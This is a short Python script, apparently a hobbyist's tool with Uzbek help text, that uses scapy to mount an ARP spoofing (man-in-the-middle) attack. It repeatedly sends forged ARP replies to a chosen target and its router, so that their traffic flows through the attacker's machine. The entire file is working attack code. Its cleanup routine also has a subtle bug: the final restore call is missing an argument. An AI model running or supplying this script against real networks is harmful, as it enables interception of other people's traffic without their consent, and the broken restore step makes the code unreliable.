#!/usr/bin/env python


import scapy.all as scapy
import time
import sys
import optparse


def g_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-f", dest="tar_ip", help=" Hujum qilmoqchi bo'lgan Qo'rulmaning IP ni yozing")
    parser.add_option("-r", dest="spoof_ip", help=" Routerning ning IP ni yozing")
    (option, arguments) = parser.parse_args()
    if not option.tar_ip:
        parser.error("ip ni kiriting yoki -- halp niyozing!")
        print(option)

    return option
def scan(ip):
  arp_re = scapy.ARP(pdst=ip)
  broat = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_re_broat = broat / arp_re
  answerad_list = scapy.srp(arp_re_broat, timeout=1, verbose=False)[0]
  return answerad_list[0][1].hwsrc

def spoof( tar_ip, spoof_ip):
  tar_mac = scan(tar_ip)
  packet = scapy.ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=spoof_ip)
#scapy.ls(scapy.ARP())
# print(packet.show())
# print(packet.summary)
  scapy.send(packet, verbose=False)

def dspoof( tar_ip, spoof_ip):
  tar_mac = scan(tar_ip)
  dis_mac = scan(spoof_ip)
  packet = scapy.ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=spoof_ip, hwsrc=dis_mac)
#scapy.ls(scapy.ARP())
# print(packet.show())
# print(packet.summary)
  scapy.send(packet, count=4, verbose=False)
s = 0;

# istisno xatolarni hal qilish uchun(try:,except xatilik nom) ishlatiladi
try:
   while True:
    s = s + 2
    option = g_arguments()
    spoof(option.tar_ip, option.spoof_ip )
    spoof(option.spoof_ip, option.tar_ip)


    # Python2 uchun bir qatorda chiqarish
    # print("\r Sent two packet  " + str(s)),
    # sys.stdout.flush()

    # Python2 uchun bir qatorda chiqarish
    print("\r Sent two packet "+ str(s), end=" ")
    time.sleep(2)
except KeyboardInterrupt:
  print("\nDetected CTRL + C ......Quitting")
  dspoof(option.tar_ip, option.spoof_ip )
  dspoof(option.spoof_ip,)